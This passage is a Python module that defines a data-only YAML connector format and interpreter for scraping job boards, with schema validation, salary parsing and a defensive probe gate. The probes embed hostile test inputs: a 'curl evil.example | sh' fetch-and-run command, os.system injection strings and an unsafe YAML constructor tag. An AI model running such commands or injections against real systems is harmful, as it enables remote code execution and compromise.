"""Declarative connector format, and the interpreter that runs it (T32).

"A hundred candidates each writing a scraper for the same job board is a
collective waste" (owner, 2026-08-18). The fix the owner chose is a library
people can borrow from, and the property that makes borrowing safe is the
title of this module: **a connector is data, not code.** One YAML file per
site names a list URL pattern, a detail URL pattern, pagination, and a
selector per normalised `Offer` (T11) field. *We* interpret it — a connector
file never runs.

## Why data and not a plugin

Borrowing a plugin means running a stranger's code on the machine where a
candidate's whole profile lives. Borrowing a connector file means running
**our** interpreter over **their** selectors, and the worst a malicious
contribution can do is return wrong text. `connector_executes_no_shared_code`
is the assertion, made mechanical the same way `dimensions.py` makes "a
dimension may not invent fields" mechanical: a closed, `extra="forbid"`
schema, plus — beyond what a dimension needs — a hand-rolled selector grammar
that is matched against, never evaluated. Concretely, nothing in this module
ever calls `eval`, `exec`, `compile`, `__import__`, `getattr` on a
connector-supplied name, or a subprocess/shell function with connector-
supplied text; `yaml.safe_load` is the only loader used, so a `!!python/…`
tag is refused before it can construct anything; and a URL pattern's only
placeholder is substituted with `str.replace`, never `str.format`, because a
connector-controlled format string is its own attribute-access injection
vector even though it never reaches `eval`. `probe_connector_isolation`
below tries each of these routes and asserts every one is refused — "the
gate is the reason" this module exists in this shape.

## What a connector may not do

* **Invent a field.** `Connector.model_config = extra="forbid"`, at every
  nesting level, is the same rule dimensions.py enforces on `dimensions/*.yaml`
  (§5.2's "connectors may not invent fields") — a typo'd or smuggled key is a
  load-time `ConnectorError`, never a silently-ignored setting. The selector
  fields themselves are further restricted to a fixed vocabulary
  (`ALLOWED_OFFER_FIELDS`) naming exactly the `Offer` fields a markup selector
  could plausibly produce, so a field named `password` or `api_key` is
  rejected for not being one of them — before it is ever asked whether it
  *looks* like a credential.
* **Carry a credential.** There is no field anywhere in this schema for one.
  Authenticated sources drive the candidate's own browser session instead
  (spec-v2-process §2's step 7, Sourcing) — `auth: candidate_session` records
  that a site needs a signed-in session, and nothing more; see
  `AuthMode` and `test_authenticated_source_uses_the_candidate_session`.
* **Run.** See above.

## What the format does not cover

Selectors run against markup that is already in the response. A site that
renders its listing or its ad body with JavaScript after load — many modern
boards — has nothing in that markup for a selector to match; this format
cannot reach it, and pretending otherwise would mean silently returning
nothing from a page that plainly has content. Such a site needs a heavier
mechanism (a headless browser) to justify itself later; it is not something a
connector file, however cleverly written, can be made to cover.

## Fetching is not this module's job

T12 is `[LAPTOP]` and owns turning a connector into HTTP requests against a
live site (a cloud session cannot reach one — 403 at the egress proxy,
confirmed 2026-08-15, per T11's module docstring). Everything here operates
on markup already in hand — a recorded fixture in a test, or, in T12's world,
a page T12 already fetched — via `parse_list_page` and `parse_detail_page`.

## Staleness

Every connector carries `version` and `last_verified`. `assess_staleness` and
`collect_listing` are how a caller learns that a connector has gone quiet
because nobody re-checked it, rather than because a search genuinely came back
empty — spec-v2-process's requirement that a stale connector is *reported*
stale rather than "quietly returning nothing".
"""

from __future__ import annotations

import json
import re
import sys
from collections.abc import Iterator
from dataclasses import dataclass, field
from datetime import date
from html.parser import HTMLParser
from pathlib import Path
from typing import Any, Literal

import yaml
from pydantic import BaseModel, ConfigDict, Field, ValidationError, field_validator, model_validator

from jobsearch.dimensions import Language
from jobsearch.offers import Location, Offer, Salary, compute_offer_id

_REPO_ROOT = Path(__file__).resolve().parents[2]
DEFAULT_CONNECTORS_DIR = _REPO_ROOT / "connectors"
DEFAULT_EVIDENCE_PATH = _REPO_ROOT / "status" / "evidence" / "T32.json"

# A placeholder, not a policy: 90 days is a starting point the owner did not
# fix a number for. Kept as a parameter everywhere (never read as a bare
# constant deep in a call chain) so a future step spec can supply its own
# without this module changing.
DEFAULT_STALE_AFTER_DAYS = 90


class ConnectorError(Exception):
    """A connector file does not fit the declarative format, or cannot be
    interpreted safely — a load-time refusal, never a runtime crash deep in
    someone else's selector."""


class Strict(BaseModel):
    """Unknown keys are an error everywhere in this schema — see the module
    docstring's "may not invent a field"."""

    model_config = ConfigDict(extra="forbid", frozen=True)


SITE_NAME = re.compile(r"^[a-z][a-z0-9_]*$")
VERSION = re.compile(r"^\d+\.\d+\.\d+$")

# The whole vocabulary of things a connector may claim to extract: exactly the
# fields `jobsearch.offers.Offer` (T11) can hold, flattened for the nested
# `location`/`salary` objects. Anything else — `password`, `cookie`, a
# scraper's own internal bookkeeping — is rejected at load by the field
# validators below, not merely left unused.
ALLOWED_OFFER_FIELDS = frozenset(
    {
        "title",
        "company",
        "url",
        "source_ref",
        "text",
        "location_raw",
        "location_country",
        "location_remote",
        "salary_min",
        "salary_max",
        "salary_currency",
        "salary_period",
    }
)
# `detail_url` is not an `Offer` field — it is the pointer from a list item to
# where the full ad lives — so it is added only for the list page's vocabulary.
LIST_FIELD_NAMES = ALLOWED_OFFER_FIELDS | {"detail_url"}

# The page's list-URL placeholder. Filled by `build_list_urls` via
# `str.replace`, never `str.format` — a connector-controlled format string
# would let `{0.__class__.__mro__[...]}`-style attribute access run before any
# `eval` is in the picture, so the placeholder is validated to be the only
# brace in the string and substituted literally.
PAGE_PLACEHOLDER = "{page}"


# ---------------------------------------------------------------------------
# the selector grammar — a closed vocabulary, matched against, never evaluated


@dataclass(frozen=True)
class SimpleSelector:
    """One compiled selector: an optional tag, id, classes and attributes.

    This is the *entire* vocabulary a connector file can use to say "find me
    this element" — no combinators, no pseudo-classes, no expressions. It is
    intentionally too small a language to smuggle anything through: every
    character in a `css` string either belongs to one of these four token
    kinds or the selector is refused at load (`compile_selector`).
    """

    tag: str | None
    id_: str | None
    classes: tuple[str, ...]
    attrs: tuple[tuple[str, str | None], ...]


_TAG_TOKEN = re.compile(r"^[a-zA-Z][\w-]*")
_OTHER_TOKEN = re.compile(r"#[\w-]+|\.[\w-]+|\[[a-zA-Z_][\w-]*(?:=(?:\"[^\"]*\"|'[^']*'))?\]")


def compile_selector(css: str) -> SimpleSelector:
    """Parse a `css` string into `SimpleSelector`, or raise `ConnectorError`.

    Every character must be consumed by one of the three token kinds
    (`#id`, `.class`, `[attr]`/`[attr="value"]`) after an optional leading tag
    name; anything left over — parentheses, quotes outside an attribute
    bracket, semicolons, whitespace, a combinator — is refused. This is what
    makes a selector like `__import__('os').system('x')` inert: it simply
    fails to parse (it is not one of the four token kinds), the same way it
    would if a human mistyped it. Nothing here ever calls `eval` on the
    string; refusal is a plain regex-driven consumption check.

    Tag names and attribute *names* are lowercased here, once, at compile
    time — never left as typed. HTML tag and attribute names are
    case-insensitive by spec, and `html.parser.HTMLParser` already lowercases
    both when it builds a `Node` (verified: `<DIV DISABLED>` tokenises to
    `tag="div"`, `attrs={"disabled": ...}`). Without this normalisation a
    selector written `DIV.job-card` or `[DISABLED]` — exactly what a
    non-programmer hand-editing a connector is liable to type — compiles
    without error and then simply never matches anything: no exception at
    load, no exception at parse, just a silently empty result, which is the
    worst possible failure mode for someone who cannot read this module to
    find out why. Attribute *values*, class names, and ids are left exactly
    as written: those ARE case-sensitive in HTML (`[data-x="Foo"]` must not
    match `data-x="foo"`, and `.Job` must not match `class="job"`), so
    lowercasing them would silently break a correctly-written connector
    instead of fixing a broken one.
    """
    text = css.strip()
    if not text:
        raise ConnectorError("empty selector")
    tag_match = _TAG_TOKEN.match(text)
    tag = tag_match.group(0).lower() if tag_match else None
    rest = text[tag_match.end() :] if tag_match else text

    id_: str | None = None
    classes: list[str] = []
    attrs: list[tuple[str, str | None]] = []
    position = 0
    for match in _OTHER_TOKEN.finditer(rest):
        if match.start() != position:
            raise ConnectorError(f"selector is not tag/#id/.class/[attr]: {css!r}")
        token = match.group(0)
        if token.startswith("#"):
            if id_ is not None:
                raise ConnectorError(f"selector names more than one id: {css!r}")
            id_ = token[1:]
        elif token.startswith("."):
            classes.append(token[1:])
        else:
            body = token[1:-1]
            name, _, value = body.partition("=")
            # Only the attribute *name* is case-insensitive HTML syntax; the
            # value (when present) is data and stays exactly as written.
            attrs.append((name.lower(), value.strip("\"'")) if value else (name.lower(), None))
        position = match.end()
    if position != len(rest):
        raise ConnectorError(f"selector is not tag/#id/.class/[attr]: {css!r}")
    if tag is None and id_ is None and not classes and not attrs:
        raise ConnectorError(f"empty selector: {css!r}")
    return SimpleSelector(tag=tag, id_=id_, classes=tuple(classes), attrs=tuple(attrs))


# ---------------------------------------------------------------------------
# a minimal, inert HTML tree — stdlib `html.parser`, nothing executed


_VOID_TAGS = frozenset(
    {
        "area",
        "base",
        "br",
        "col",
        "embed",
        "hr",
        "img",
        "input",
        "link",
        "meta",
        "param",
        "source",
        "track",
        "wbr",
    }
)


@dataclass
class Node:
    """One element in a parsed page. `<script>`/`<style>` content lands here
    exactly like any other text — it is stored, matched against selectors like
    any other node, and never executed; there is no interpreter for it to run
    in."""

    tag: str
    attrs: dict[str, str]
    children: list[Node | str] = field(default_factory=list)

    def matches(self, selector: SimpleSelector) -> bool:
        if selector.tag is not None and self.tag != selector.tag:
            return False
        if selector.id_ is not None and self.attrs.get("id") != selector.id_:
            return False
        node_classes = set(self.attrs.get("class", "").split())
        if not set(selector.classes).issubset(node_classes):
            return False
        for name, value in selector.attrs:
            if name not in self.attrs:
                return False
            if value is not None and self.attrs[name] != value:
                return False
        return True

    def iter_descendants(self) -> Iterator[Node]:
        for child in self.children:
            if isinstance(child, Node):
                yield child
                yield from child.iter_descendants()

    def text_content(self) -> str:
        pieces = [piece for piece in self._iter_text() if piece.strip()]
        return " ".join(" ".join(piece.split()) for piece in pieces).strip()

    def _iter_text(self) -> Iterator[str]:
        for child in self.children:
            if isinstance(child, str):
                yield child
            else:
                yield from child._iter_text()


class _TreeBuilder(HTMLParser):
    """Builds a `Node` tree. Malformed markup degrades gracefully — an
    unclosed tag is simply never popped, and the document root always closes
    its own children — the same tolerance a browser's parser has, needed
    because a "recorded fixture" is exactly the kind of imperfect real-world
    HTML this has to survive."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.root = Node(tag="[document]", attrs={})
        self._stack: list[Node] = [self.root]

    def _attrs_dict(self, attrs: list[tuple[str, str | None]]) -> dict[str, str]:
        return {name: (value if value is not None else "") for name, value in attrs}

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        node = Node(tag=tag, attrs=self._attrs_dict(attrs))
        self._stack[-1].children.append(node)
        if tag not in _VOID_TAGS:
            self._stack.append(node)

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self._stack[-1].children.append(Node(tag=tag, attrs=self._attrs_dict(attrs)))

    def handle_endtag(self, tag: str) -> None:
        for index in range(len(self._stack) - 1, 0, -1):
            if self._stack[index].tag == tag:
                del self._stack[index:]
                return

    def handle_data(self, data: str) -> None:
        if data:
            self._stack[-1].children.append(data)


def parse_html(html: str) -> Node:
    """Turn a page of markup into a `Node` tree. `HTMLParser` tokenises;
    nothing it produces is ever executed — every tag becomes a `Node`, every
    run of text becomes a string, full stop."""
    builder = _TreeBuilder()
    builder.feed(html)
    builder.close()
    return builder.root


def select_first(root: Node, selector: SimpleSelector) -> Node | None:
    """The first descendant of `root` matching `selector`, in document order,
    or `None`."""
    for node in root.iter_descendants():
        if node.matches(selector):
            return node
    return None


def select_all(root: Node, selector: SimpleSelector) -> list[Node]:
    """Every descendant of `root` matching `selector`, in document order."""
    return [node for node in root.iter_descendants() if node.matches(selector)]


# ---------------------------------------------------------------------------
# the schema


AuthMode = Literal["none", "candidate_session"]


class FieldSelector(Strict):
    """One field's extraction rule: where to look, and what to take from the
    match. This is the entire per-field vocabulary — a selector plus an
    optional attribute name — precisely so there is no field here for a
    template, a regex substitution, or anything else that would need to run
    connector-supplied code to apply."""

    css: str = Field(min_length=1)
    attr: str | None = None

    @field_validator("css")
    @classmethod
    def _selector_compiles(cls, css: str) -> str:
        # Refused here, at load, not merely left unused at parse time — an
        # unusable or smuggled selector is a defect in the file, not a
        # runtime surprise for whoever later calls `parse_detail_page`.
        try:
            compile_selector(css)
        except ConnectorError as exc:
            raise ValueError(str(exc)) from exc
        return css


class Pagination(Strict):
    """How a listing continues past its first page. Stored as data for a
    fetcher (T12) to walk — this module never issues a request."""

    mode: Literal["none", "query_param", "path_segment"] = "none"
    param: str | None = Field(default=None, min_length=1)
    start: int = Field(default=1, ge=0)
    max_pages: int = Field(default=1, ge=1, le=1000)

    @model_validator(mode="after")
    def _param_named_when_paginating(self) -> Pagination:
        if self.mode != "none" and not self.param:
            raise ValueError("pagination.param is required when pagination.mode is not 'none'")
        return self

    @model_validator(mode="after")
    def _no_pagination_means_exactly_one_page(self) -> Pagination:
        # `mode: none` is a structural claim — "this site has no second
        # page" — not merely "no query parameter is named for it". Leaving
        # `max_pages` above its default of 1 while declaring `mode: none` is
        # a self-contradicting connector: nothing describes what a second,
        # third, ... page's URL would even be, so `build_list_urls` would
        # have nothing to vary and would emit the same URL `max_pages`
        # times — duplicate requests, and duplicate offers once T12 fetches
        # them. Caught here, at load, a contributor sees the mistake in the
        # file they just wrote; `build_list_urls` also defends against this
        # independently (belt-and-suspenders, the same posture the rest of
        # this module takes toward its own safety properties) so that a
        # `page_count` override or a connector loaded before this validator
        # existed still cannot duplicate a request.
        if self.mode == "none" and self.max_pages > 1:
            raise ValueError(
                "pagination.mode is 'none' but max_pages > 1 — a site with no "
                "pagination cannot have more than one page; set mode or lower max_pages"
            )
        return self


class ListPage(Strict):
    """The search-results page: how to reach it, how it continues, and one
    selector per item container plus per field within it."""

    url_pattern: str = Field(min_length=1)
    pagination: Pagination = Field(default_factory=Pagination)
    item: str = Field(min_length=1)
    fields: dict[str, FieldSelector] = Field(min_length=1)

    @field_validator("item")
    @classmethod
    def _item_selector_compiles(cls, item: str) -> str:
        try:
            compile_selector(item)
        except ConnectorError as exc:
            raise ValueError(str(exc)) from exc
        return item

    @field_validator("fields")
    @classmethod
    def _field_names_are_in_the_closed_vocabulary(
        cls, fields: dict[str, FieldSelector]
    ) -> dict[str, FieldSelector]:
        unknown = sorted(set(fields) - LIST_FIELD_NAMES)
        if unknown:
            raise ValueError(
                f"list field name(s) not in the allowed vocabulary: {', '.join(unknown)}"
            )
        return fields

    @field_validator("url_pattern")
    @classmethod
    def _pattern_uses_only_the_page_placeholder(cls, pattern: str) -> str:
        # `str.format()` over a connector-controlled template is its own
        # injection class (attribute access via `{0.__class__...}`) even
        # though it stops short of code execution — refusing any brace other
        # than the literal `{page}` closes that off structurally, rather than
        # trusting every future caller to keep using `str.replace`.
        if pattern.replace(PAGE_PLACEHOLDER, "").count("{") or pattern.replace(
            PAGE_PLACEHOLDER, ""
        ).count("}"):
            raise ValueError(
                f"url_pattern may only use the literal {{page}} placeholder: {pattern!r}"
            )
        return pattern


class DetailPage(Strict):
    """The single-ad page reached from a list item's `detail_url`."""

    fields: dict[str, FieldSelector] = Field(min_length=1)

    @field_validator("fields")
    @classmethod
    def _field_names_are_in_the_closed_vocabulary(
        cls, fields: dict[str, FieldSelector]
    ) -> dict[str, FieldSelector]:
        unknown = sorted(set(fields) - ALLOWED_OFFER_FIELDS)
        if unknown:
            raise ValueError(
                f"detail field name(s) not in the allowed vocabulary: {', '.join(unknown)}"
            )
        return fields


class Connector(Strict):
    """One site's connector — `connectors/<site>_<locale>.yaml`.

    `version` and `last_verified` back `assess_staleness`; `auth` is the only
    place authentication is ever mentioned, and it can only ever name "the
    candidate's own browser session" — see the module docstring's "may not
    carry a credential".
    """

    site: str = Field(pattern=SITE_NAME.pattern, min_length=2, max_length=64)
    locale: Language
    version: str = Field(pattern=VERSION.pattern)
    last_verified: date
    auth: AuthMode = "none"
    list: ListPage
    detail: DetailPage | None = None

    @model_validator(mode="after")
    def _something_produces_the_offer_text(self) -> Connector:
        # `Offer.text` (T11) is required and never guessed. A connector that
        # selects nothing for it would only be discovered dead at parse time,
        # against whatever fixture happened to be run first — reject it here
        # instead, where every connector is checked the same way regardless of
        # which page anyone remembers to test.
        list_has_text = "text" in self.list.fields
        detail_has_text = self.detail is not None and "text" in self.detail.fields
        if not (list_has_text or detail_has_text):
            raise ValueError(
                "no selector produces 'text' — nothing here for the offer body"
            )
        return self


# ---------------------------------------------------------------------------
# loading


def _format(exc: ValidationError) -> str:
    parts = []
    for error in exc.errors():
        location = ".".join(str(part) for part in error["loc"]) or "<root>"
        parts.append(f"{location}: {error['msg']}")
    return "; ".join(parts)


def parse_connector(text: str) -> Connector:
    """Turn connector YAML text into a `Connector`, or raise `ConnectorError`.

    `yaml.safe_load` is the only loader used anywhere in this module — it
    resolves only the built-in scalar/sequence/mapping tags, so a
    `!!python/object` (or any other constructor) tag raises a `YAMLError`
    here rather than instantiating anything.
    """
    try:
        raw = yaml.safe_load(text)
    except yaml.YAMLError as exc:
        raise ConnectorError(f"not valid YAML: {exc}") from exc
    if not isinstance(raw, dict):
        raise ConnectorError(f"expected a mapping, got {type(raw).__name__}")
    try:
        return Connector.model_validate(raw)
    except ValidationError as exc:
        raise ConnectorError(_format(exc)) from exc


def _read(path: Path) -> str:
    if not path.exists():
        raise ConnectorError(f"connector file not found: {path}")
    try:
        return path.read_text(encoding="utf-8")
    except UnicodeDecodeError as exc:
        raise ConnectorError(f"{path.name}: not valid UTF-8: {exc}") from exc
    except OSError as exc:
        raise ConnectorError(f"{path.name}: cannot be read: {exc}") from exc


def load_connector(path: Path) -> Connector:
    """Read one `connectors/<site>_<locale>.yaml` file.

    The filename is part of the contract, the same way a dimension's filename
    must match its `id` (`dimensions.py`): "one file per site naming the site
    and its locale" (payload) is meaningless if the file can call itself
    anything, so a mismatch is a load-time `ConnectorError` like any other.
    """
    connector = parse_connector(_read(path))
    expected_stem = f"{connector.site}_{connector.locale}"
    if path.stem != expected_stem:
        raise ConnectorError(
            f"{path.name}: site/locale {expected_stem!r} does not match filename "
            f"(expected {expected_stem}{path.suffix})"
        )
    return connector


def load_connectors(directory: Path = DEFAULT_CONNECTORS_DIR) -> list[Connector]:
    """Load every connector in `directory`, sorted by filename stem."""
    if not directory.is_dir():
        raise ConnectorError(f"connector directory not found: {directory}")
    paths = sorted(p for p in directory.iterdir() if p.suffix in {".yaml", ".yml"})
    return [load_connector(path) for path in paths]


# ---------------------------------------------------------------------------
# interpretation — parsing recorded markup with a loaded connector


def build_list_urls(connector: Connector, *, page_count: int | None = None) -> list[str]:
    """The sequence of list-page URLs `connector.list` describes.

    `pagination.mode` is honoured, not just `max_pages`: `mode: "none"`
    means the site has no second page to describe, so when the *connector's
    own* `max_pages` is what decides the count (`page_count` not given),
    exactly one URL is returned regardless of what `max_pages` says.
    `Pagination`'s own validator already refuses `max_pages > 1` alongside
    `mode: "none"` at load — a well-formed, freshly-loaded connector cannot
    reach this function in the contradictory state at all — but the clamp is
    repeated here rather than trusted to have happened upstream, because a
    `Connector`/`Pagination` built via `model_copy(update=...)` (as this
    module's own tests do, and as a future caller might) does not re-run
    Pydantic validators, so the contradiction can still exist on an in-memory
    object. Without this clamp such an object would make `build_list_urls`
    emit the *same* URL `max_pages` times — T12's fetcher issuing duplicate
    identical requests and potentially collecting duplicate offers.

    An explicit `page_count` argument is a caller's direct instruction for
    how many URLs to build and is honoured as given, exactly as before —
    `mode` only overrides the *default* derived from the connector's own
    `max_pages`.

    Substitution is `str.replace`, not `str.format` — see `PAGE_PLACEHOLDER`'s
    comment. This never issues a request; T12 does that.
    """
    if page_count is not None:
        pages = page_count
    else:
        pages = connector.list.pagination.max_pages
        if connector.list.pagination.mode == "none":
            pages = min(pages, 1)
    start = connector.list.pagination.start
    return [
        connector.list.url_pattern.replace(PAGE_PLACEHOLDER, str(start + offset))
        for offset in range(pages)
    ]


def _extract(node: Node, selector: FieldSelector, compiled: SimpleSelector) -> str | None:
    match = select_first(node, compiled)
    if match is None:
        return None
    if selector.attr is not None:
        value = match.attrs.get(selector.attr)
        return value or None
    text = match.text_content()
    return text or None


def parse_list_page(connector: Connector, html: str) -> list[dict[str, str]]:
    """Every item on one page of `connector.list`, as field-name → value.

    Interpretation only — this never fetches anything and never touches a
    connector-supplied string except by matching it against the closed
    selector grammar compiled at load time.
    """
    root = parse_html(html)
    item_selector = compile_selector(connector.list.item)
    compiled_fields = {name: compile_selector(fs.css) for name, fs in connector.list.fields.items()}
    records: list[dict[str, str]] = []
    for item in select_all(root, item_selector):
        record: dict[str, str] = {}
        for name, field_selector in connector.list.fields.items():
            value = _extract(item, field_selector, compiled_fields[name])
            if value is not None:
                record[name] = value
        records.append(record)
    return records


def parse_detail_page(connector: Connector, html: str) -> dict[str, str]:
    """Every field of `connector.detail` found on one ad's own page."""
    if connector.detail is None:
        return {}
    root = parse_html(html)
    record: dict[str, str] = {}
    for name, field_selector in connector.detail.fields.items():
        compiled = compile_selector(field_selector.css)
        value = _extract(root, field_selector, compiled)
        if value is not None:
            record[name] = value
    return record


def _as_float(value: str | None) -> float | None:
    """Parse a salary number that may be written in either the
    thousands-comma/decimal-dot convention (`"1,234.56"`, US/UK) or the
    thousands-dot/decimal-comma convention (`"1.234,56"`, most of continental
    Europe — including `es`, the locale of the only shipped connector,
    `connectors/examplejobs_es.yaml`). Naively stripping commas and keeping
    dots — the previous behaviour — silently turns `"1.234,56"` into
    `"1.23456"`: a ~1000x error with no exception, feeding straight into
    `Salary.min`/`Salary.max` and therefore into ranking. That is worse than
    returning nothing, so every branch below that cannot resolve the format
    with confidence returns `None` instead of guessing.

    Disambiguation rule, applied in this order:

    1. **Both separators present** (`.` and `,` both occur): the one that
       occurs *last* in the string is the decimal separator — it must occur
       exactly once — and every occurrence of the other character is a
       thousands separator, stripped. Covers `"1.234,56"` (comma last →
       decimal) and `"1,234.56"` (dot last → decimal) unambiguously; a
       decimal separator occurring more than once (e.g. malformed input) is
       refused, not guessed at.
    2. **One separator character, appearing exactly once**: if exactly three
       digits follow it, it is read as a thousands separator (`"1.234"` →
       `1234`, `"1,234"` → `1234`) — grouped-thousands is by far the more
       common reason a whole number carries a lone separator followed by
       exactly three digits, and salary figures are rarely quoted to three
       decimal places. Any other digit count after it (one, two, four or
       more) is read as the decimal separator (`"1234,56"` → `1234.56`,
       `"1234.5"` → `1234.5`). This one case is a deliberate, named
       resolution of what would otherwise be genuinely ambiguous — see the
       module's evidence gate philosophy: a documented rule beats a silent
       guess.
    3. **One separator character, appearing more than once**: only valid as
       repeated thousands-grouping (`"1.234.567"` → `1234567`,
       `"1,234,567"` → `1234567`) — the leading group must be 1-3 digits and
       every later group exactly 3; anything else (`"1.2.3"`, uneven groups)
       is genuinely ambiguous and returns `None`.
    4. **No separator**: parsed as a plain integer string.

    A leading `+`/`-` sign is preserved through every branch. Anything that
    does not reduce to plain digits (letters, multiple decimal points,
    empty groups) returns `None` rather than raising — same contract as the
    rest of this module's parsing: absent, never confidently wrong.
    """
    if value is None:
        return None
    text = value.strip().replace(" ", "").replace("\xa0", "")
    if not text:
        return None
    sign = ""
    if text[0] in "+-":
        sign, text = text[0], text[1:]
    if not text:
        return None

    dot_positions = [index for index, char in enumerate(text) if char == "."]
    comma_positions = [index for index, char in enumerate(text) if char == ","]

    candidate: str
    if dot_positions and comma_positions:
        if dot_positions[-1] > comma_positions[-1]:
            decimal_char, decimal_positions, thousands_char = ".", dot_positions, ","
        else:
            decimal_char, decimal_positions, thousands_char = ",", comma_positions, "."
        if len(decimal_positions) != 1:
            return None  # the "decimal" separator repeats — not a format we recognise
        integer_part, _, frac_part = text.rpartition(decimal_char)
        integer_part = integer_part.replace(thousands_char, "")
        if not integer_part.isdigit() or not frac_part.isdigit():
            return None
        candidate = f"{integer_part}.{frac_part}"
    elif dot_positions or comma_positions:
        sep_char = "." if dot_positions else ","
        positions = dot_positions or comma_positions
        if len(positions) == 1:
            following_digits = len(text) - positions[0] - 1
            if following_digits == 3:
                digits_only = text.replace(sep_char, "")
                if not digits_only.isdigit():
                    return None
                candidate = digits_only
            else:
                integer_part, _, frac_part = text.partition(sep_char)
                if not integer_part.isdigit() or not frac_part.isdigit():
                    return None
                candidate = f"{integer_part}.{frac_part}"
        else:
            groups = text.split(sep_char)
            if (
                all(group.isdigit() for group in groups)
                and 1 <= len(groups[0]) <= 3
                and all(len(group) == 3 for group in groups[1:])
            ):
                candidate = "".join(groups)
            else:
                return None  # inconsistent grouping — genuinely ambiguous
    else:
        if not text.isdigit():
            return None
        candidate = text

    try:
        return float(f"{sign}{candidate}")
    except ValueError:
        return None


def build_offer(
    connector: Connector,
    *,
    list_fields: dict[str, str] | None = None,
    detail_fields: dict[str, str] | None = None,
    url: str | None = None,
    source_ref: str | None = None,
) -> Offer:
    """Combine one item's list- and detail-page extractions into a
    normalised `Offer` (T11).

    Detail fields win on overlap — the detail page is the fuller record when
    both exist. `text` must survive from one page or the other; `Offer`
    itself refuses a blank body, and there is nothing here to invent one from.
    """
    merged: dict[str, str] = {**(list_fields or {}), **(detail_fields or {})}
    text = merged.get("text")
    if not text:
        raise ConnectorError("connector produced no 'text' field — nothing for the offer body")

    location = None
    if any(k in merged for k in ("location_raw", "location_country", "location_remote")):
        location = Location(
            raw=merged.get("location_raw"),
            country=merged.get("location_country"),
            remote=merged.get("location_remote"),
        )
    salary = None
    if any(k in merged for k in ("salary_min", "salary_max", "salary_currency", "salary_period")):
        salary = Salary(
            min=_as_float(merged.get("salary_min")),
            max=_as_float(merged.get("salary_max")),
            currency=merged.get("salary_currency"),
            period=merged.get("salary_period"),
            stated=True,
        )
    try:
        return Offer(
            id=compute_offer_id(text),
            source=connector.site,
            source_ref=source_ref or merged.get("source_ref"),
            url=url or merged.get("url"),
            title=merged.get("title"),
            company=merged.get("company"),
            location=location,
            salary=salary,
            language=connector.locale,
            text=text,
        )
    except ValidationError as exc:
        raise ConnectorError(f"parsed fields did not produce a valid offer: {exc}") from exc


# ---------------------------------------------------------------------------
# staleness


@dataclass(frozen=True)
class Staleness:
    """One connector's age against `max_age_days`, and the sentence a caller
    should say about it — never just a bare boolean, per spec-v2-process's
    "the tool should say so"."""

    connector_id: str
    days_since_verification: int
    stale: bool
    reason: str | None


def assess_staleness(
    connector: Connector,
    *,
    today: date | None = None,
    max_age_days: int = DEFAULT_STALE_AFTER_DAYS,
) -> Staleness:
    """How long since `connector.last_verified`, and whether that exceeds
    `max_age_days`."""
    as_of = today if today is not None else date.today()
    age = (as_of - connector.last_verified).days
    stale = age > max_age_days
    connector_id = f"{connector.site}_{connector.locale}"
    reason = (
        f"{connector_id} was last verified {age} day(s) ago (limit {max_age_days})"
        if stale
        else None
    )
    return Staleness(
        connector_id=connector_id, days_since_verification=age, stale=stale, reason=reason
    )


@dataclass(frozen=True)
class ListingResult:
    """One page's parse, plus whether its connector is trustworthy right now.

    Kept together on purpose: a caller reading only `items` would treat a
    stale connector's empty page exactly like a search that genuinely came
    back empty — the "quietly returning nothing" spec-v2-process forbids.
    """

    items: tuple[dict[str, str], ...]
    stale: bool
    message: str | None


def collect_listing(
    connector: Connector,
    html: str,
    *,
    today: date | None = None,
    max_age_days: int = DEFAULT_STALE_AFTER_DAYS,
) -> ListingResult:
    """Parse one listing page and report it next to the connector's staleness."""
    items = parse_list_page(connector, html)
    staleness = assess_staleness(connector, today=today, max_age_days=max_age_days)
    message = None
    if staleness.stale:
        empty = " and returned zero listings" if not items else ""
        message = (
            f"{staleness.reason}{empty} — reported stale, not trusted as a real result"
        )
    return ListingResult(items=tuple(items), stale=staleness.stale, message=message)


# ---------------------------------------------------------------------------
# the gate — adversarial probes proving nothing a connector supplies runs


@dataclass(frozen=True)
class ProbeReport:
    """What the gate measured: how many adversarial attempts ran, and which
    ones were not refused."""

    probes_run: int
    violations: tuple[str, ...]


def probe_connector_isolation() -> ProbeReport:
    """Try every way a connector file could try to run code, and count the
    ones that got through.

    Mirrors `jobsearch.identity.probe_leaks`'s shape: this is the gate's
    measurement, deliberately adversarial, and a probe that returns normally
    where it should have been refused is a violation — named, not swallowed.
    """
    violations: list[str] = []
    probes = 0

    def must_be_refused(label: str, attempt: Any) -> None:
        nonlocal probes
        probes += 1
        try:
            attempt()
        except (ConnectorError, ValidationError, ValueError):
            return
        violations.append(label)

    # 1. An unsafe YAML tag attempting to construct an arbitrary object.
    must_be_refused(
        "!!python/object tag constructs an object instead of failing to load",
        lambda: parse_connector(
            "site: !!python/object/apply:builtins.str ['x']\n"
            "locale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.x'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 2. A Python expression as a selector — must fail to *parse*, not run.
    must_be_refused(
        "a python expression as a css selector is accepted instead of refused",
        lambda: compile_selector("__import__('os').system('touch /tmp/pwned')"),
    )

    # 3. The same, smuggled inside an otherwise well-formed connector file —
    #    caught by `FieldSelector`'s own validator, at load, not merely when
    #    something later tries to use it.
    must_be_refused(
        "a smuggled selector expression loads successfully as a connector field",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: \"__import__('os').system('x')\"}\n"
        ),
    )

    # 4. An unknown top-level key — the shell-command-shaped smuggling case
    #    from the payload — must be refused by `extra='forbid'`.
    must_be_refused(
        "an unknown top-level key ('shell') is accepted instead of refused",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "shell: \"curl evil.example | sh\"\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 5. A lambda as a bare value — not executable YAML, just a string that
    #    fails `site`'s own pattern.
    must_be_refused(
        "a lambda-shaped string is accepted as a site name",
        lambda: parse_connector(
            "site: \"lambda: __import__('os').system('x')\"\nlocale: en\n"
            "version: '1.0.0'\nlast_verified: '2026-01-01'\n"
